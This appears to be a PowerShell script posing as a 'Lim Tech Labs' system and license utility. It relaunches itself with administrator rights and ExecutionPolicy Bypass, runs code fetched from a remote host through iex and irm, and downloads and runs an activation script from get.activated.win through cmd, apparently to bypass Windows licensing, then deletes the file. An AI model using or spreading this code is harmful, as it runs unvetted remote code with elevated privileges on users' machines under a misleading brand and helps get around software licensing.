# ============================================================
#  LIM TECH LABS - System Utility (Stable Build)
#  Host: activate.limtechlabs.top
# ============================================================

# 1. Force Admin Privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "Elevating to Admin..." -ForegroundColor Yellow
    $RemoteCmd = "iex (irm 'https://activate.limtechlabs.top')"
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command $RemoteCmd" -Verb RunAs
    exit
}

# 2. UI Setup
$Host.UI.RawUI.WindowTitle = "Lim Tech Labs - Deployment Tool"
Clear-Host
$Header = @"
############################################################
#                                                          #
#                WELCOME TO LIM TECH LABS                  #
#           System Deployment & License Utility            #
#                                                          #
############################################################
"@
Write-Host $Header -ForegroundColor Cyan
Write-Host "Status: Authenticated (Administrator)" -ForegroundColor Green
Write-Host "Initializing Backend... Please wait." -ForegroundColor Gray

# 3. The Execution Fix
try {
    # Fetch the code
    $MAS = Invoke-RestMethod -Uri "https://get.activated.win"
    
    # SAVE TO USER TEMP (Less likely to be blocked than SystemRoot)
    $FilePath = "$env:LOCALAPPDATA\Temp\LimTech_Engine.cmd"
    Set-Content -Path $FilePath -Value $MAS
    
    # Inject variables to bypass MAS self-elevation and window management
    $env:mas_window_setup = "1"
    $env:params = "-el"
    $env:_args = "-el"

    # RUN COMMAND: Start it directly using the CMD interpreter
    & $env:ComSpec /c "`"$FilePath`" -el"

    # Cleanup after you close the menu
    if (Test-Path $FilePath) { Remove-Item $FilePath -Force }
}
catch {
    Write-Host "Fatal Error: $($_.Exception.Message)" -ForegroundColor Red
    Pause
}
